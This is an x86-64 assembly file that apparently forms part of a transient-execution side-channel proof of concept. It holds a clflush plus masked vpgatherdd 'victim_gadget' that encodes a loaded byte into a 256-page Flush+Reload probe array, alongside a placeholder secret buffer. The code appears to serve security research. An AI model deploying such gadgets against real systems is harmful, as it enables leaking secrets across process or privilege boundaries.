#include "config.h"

.data

.align 0x1000
    .global oracles
oracles:
    .space 4096*256, 0


    .global address_index
address_index:
    .space 4096, 0

    .global address_buffer
address_buffer:
    .space 4096, 0

    .global address_secret
address_secret:
    .space 4096, '*'



.text

    # %rdi address
    .align 0x1000
    .global load_vmm
load_vmm:
    vmovups (%rdi), %zmm0
    ret 

    # %rdi: access_control_buffer
    # %rsi: buffer
   .global victim_gadget
victim_gadget: 
    push %r13 
    clflush (%rdi)
    mov (%rdi), %rax
    vpxord %zmm4, %zmm4, %zmm4    
    mov $0b1, %r13
    kmovq %r13, %k1
    vpgatherdd 0(%rdi, %zmm4, 1), %zmm5{%k1} 

#if DOUBLE_GATHER
    kmovq %r13, %k1
    vpgatherdd 0(%rsi, %zmm5, 1), %zmm4{%k1}
    movq %xmm4, %rax
#else
    movq %xmm5, %rax
    mov (%rsi, %rax, 1), %rax
#endif

    lea oracles, %r13
    and $0xff, %rax
    shlq $12, %rax
    mov (%r13,%rax,1), %rax
    pop %r13
    ret

